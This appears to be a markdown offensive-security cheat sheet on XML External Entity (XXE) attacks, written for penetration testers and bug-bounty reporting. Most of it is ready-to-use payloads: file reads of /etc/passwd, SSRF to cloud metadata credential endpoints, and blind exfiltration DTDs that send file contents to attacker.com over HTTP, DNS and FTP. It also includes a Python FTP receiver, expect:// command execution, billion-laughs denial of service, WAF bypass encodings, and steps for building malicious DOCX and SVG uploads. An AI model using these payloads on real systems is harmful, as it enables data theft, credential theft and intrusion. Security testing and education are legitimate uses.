---
tags:
  - critical
  - server-side
---

# XML External Entity (XXE)

## TL;DR

Exploit XML parsers to read files, perform SSRF, or execute code.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

## Detection

### Basic Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "xxe_test">]>
<data>&test;</data>
```

If `xxe_test` appears → XXE possible.

### External Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<data>&xxe;</data>
```

## File Read

### Basic

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### Windows

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

### PHP Filter (Base64)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

### Directory Listing (Java)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>
```

## SSRF via XXE

### Internal Network

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<data>&xxe;</data>
```

### Cloud Metadata

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
```

## Blind XXE

### OOB Detection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe_test">%xxe;]>
```

### OOB Data Exfiltration

**evil.dtd (on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

### FTP Exfiltration (Multi-line)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
```

## Error-Based XXE

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Local DTD Exploitation

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

## DoS

### Billion Laughs

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

## XInclude

When you can't control DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

## Office Documents (DOCX/XLSX)

1. Unzip document
2. Edit `word/document.xml`
3. Insert XXE payload
4. Rezip and upload

## Protocol Handlers

```
file://      Local files
http://      HTTP requests
ftp://       FTP (multi-line exfil)
gopher://    SSRF chains
jar://       Java archive
php://       PHP wrappers
expect://    Command execution
phar://      PHP archives
```

## WAF Bypass

### UTF-7 Encoding

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo...
```

### Parameter Entities

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

## Content-Type Manipulation

**XML Instead of JSON:**
```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

## Checklist

1. Check for XML endpoints (Content-Type: application/xml)
2. Try converting JSON → XML
3. Test file upload (SVG, DOCX, XLSX)
4. Check RSS/Atom feed parsers
5. Test SOAP endpoints
6. Try XInclude for partial control
7. Test error-based if blind
8. Check OOB interaction (DNS/HTTP)
9. Look for local DTD files

## Tools

```bash
# xxeserv
xxeserv -w -p 8000

# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt
```

## Real Examples

- **HackerOne #486732 (DuckDuckGo):** Blind XXE
- **HackerOne #248668 (Twitter SMS):** XXE in SXMP protocol

---

## Advanced Out-of-Band Techniques

### DNS Exfiltration

**Most stealthy method - works even when HTTP blocked.**

**evil.dtd (hosted on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/xxe'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

**Result:**
```
DNS query: ubuntu-server.attacker.com
```

**Monitoring:**
```bash
# Use Burp Collaborator or interactsh
interactsh-client -v

# Or DNS server logs
tail -f /var/log/named/queries.log | grep attacker.com
```

### Multi-line DNS Exfiltration

**Challenge:** DNS queries don't support newlines.

**Solution - Base64 encoding:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

**Alternative - Chunked exfil:**
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

Server-side chunking via repeated requests with line numbers.

### FTP Exfiltration (Multi-line Direct)

**Advantage:** FTP supports multi-line data in credentials.

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

**FTP Server (Python):**
```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
authorizer.add_anonymous("/tmp")

handler = FTPHandler
handler.authorizer = authorizer
handler.banner = "XXE FTP Exfil Server"

address = ("0.0.0.0", 21)
server = FTPServer(address, handler)
server.serve_forever()
```

Check logs for attempted usernames (will contain file contents).

## XInclude Bypass

**When you can't control DOCTYPE but can control element content.**

**Standard XXE (blocked):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**XInclude (often allowed):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**SOAP Envelope Example:**
```xml
<soap:Body>
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
</soap:Body>
```

**Blind XInclude (OOB):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://attacker.com/xxe"/>
</foo>
```

**Why it works:** XInclude is processed during XML parsing, even without DOCTYPE control.

## XSLT document() Function

**When XSLT transformations are processed server-side.**

**Vulnerable XSLT:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**File Read:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <h1>File Contents:</h1>
        <pre><xsl:copy-of select="document('file:///etc/passwd')"/></pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**SSRF via XSLT:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>
```

**OOB Exfil:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="file" select="document('file:///etc/hostname')"/>
    <xsl:variable name="exfil" select="document(concat('http://attacker.com/?data=', $file))"/>
  </xsl:template>
</xsl:stylesheet>
```

**Detection:** Look for:
- File upload accepting `.xsl`, `.xslt`
- Parameters named `xslt`, `stylesheet`, `transform`
- Endpoints like `/transform`, `/convert`, `/report`

## Advanced Protocol Handlers

### PHP Wrappers

**Base64 Filter (bypass encoding issues):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

**Expect (RCE if enabled):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>
```

**Data URI:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain,Hello%20World">
]>
<data>&xxe;</data>
```

### Java-Specific Handlers

**Jar Protocol (read from archives):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///var/lib/app/app.jar!/META-INF/MANIFEST.MF">
]>
```

**Netdoc (directory listing):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc:/etc/">
]>
```

**Gopher (arbitrary protocols):**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:3306/_SELECT%20password%20FROM%20users">
]>
```

## Hidden XXE Surfaces

### SAML Responses

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Assertion>
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>
```

### RSS/Atom Feeds

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

### DOCX/XLSX/PPTX (Office Documents)

```bash
# 1. Create document
# 2. Unzip
unzip document.docx -d extracted/

# 3. Edit word/document.xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>

# 4. Re-zip
cd extracted/
zip -r ../malicious.docx *

# 5. Upload to server-side processors (DocuSign, converters, etc.)
```

### SVG Images

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>
```

Upload to:
- Profile pictures
- Logo uploads
- Image processors (ImageMagick, etc.)
- PDF generators

### SOAP Endpoints

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>
      <username>&xxe;</username>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
```

## Detection Methodology

**Priority Testing Order:**
1. **OOB HTTP/DNS** (least intrusive)
2. **Error-based** (if no response reflection)
3. **XInclude** (when DOCTYPE blocked)
4. **XSLT document()** (if transformations present)
5. **File read** (once confirmed vulnerable)

**OAST Setup:**
```bash
# Burp Collaborator
# Or interactsh
interactsh-client -v

# Payload
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://xxxxxx.oastify.com">
  %xxe;
]>
```

**Confirmation Workflow:**
```
1. OOB ping → Confirms parsing external entities
2. File read (/etc/hostname) → Confirms file access
3. Sensitive file (/etc/passwd) → Impact demonstration
4. Cloud metadata → Critical impact proof
```

## WAF/Filter Bypass

**UTF-16 Encoding:**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Mixed Encoding:**
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo ...
```

**Case Variations:**
```xml
<!DoCtYpE foo [<!EnTiTy xxe SYSTEM "file:///etc/passwd">]>
```

**HTML Entities:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://&#x2F;etc&#x2F;passwd">]>
```

## Impact Quantification

**For Bug Reports:**
```
Severity Assessment:
1. File read → High (sensitive data exposure)
2. File read + cloud metadata → Critical (AWS keys)
3. SSRF to internal services → High/Critical
4. RCE via expect:// → Critical
5. DoS via billion laughs → Medium

Proof Requirements:
- Screenshots of /etc/hostname or /etc/passwd
- Cloud metadata credentials
- OAST callback logs with timestamps
- Video demonstration for complex chains
```
